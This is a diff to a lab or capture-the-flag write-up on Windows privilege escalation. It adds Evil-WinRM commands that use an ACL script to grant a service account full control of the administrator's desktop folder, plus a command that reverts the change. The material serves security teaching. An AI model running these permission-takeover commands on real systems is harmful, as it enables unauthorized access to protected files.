@@ -157,6 +157,10 @@ Now we can use **Copy-FileSeBackupPrivilege** to copy files from our Shadow driv
 ## Additional
 There is another way that still involves the **SeBackupPrivilege** and **SeRestorePrivilege**. It’s to modify **ACL** and grant myself *full access* to the file/folder I specified using [this PowerShell script](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1). In the following, I use that script to own the entire admin’s desktop folder.
 ```console
-*Evil-WinRM* PS C:\Users\svc-printer\chrp>Import-Module .\Acl-FullControl.ps1
-*Evil-WinRM* PS C:\Users\svc-printer\chrp>Acl-FullControl -user return\svc-printer -path c:\users\administrator\desktop
+*Evil-WinRM* PS C:\Users\svc-printer\chrp> Import-Module .\Acl-FullControl.ps1
+*Evil-WinRM* PS C:\Users\svc-printer\chrp> Acl-FullControl -user return\svc-printer -path c:\users\administrator\desktop
+```
+The [anti script](https://github.com/fahmifj/AAD-scripts/blob/main/Acl-RevokeFullControl.ps1) to revert
+```console
+*Evil-WinRM* PS C:\Users\svc-printer\chrp> Acl-RevokeFullControl -User return\svc-printer -Path C:\users\administrator\desktop
 ```
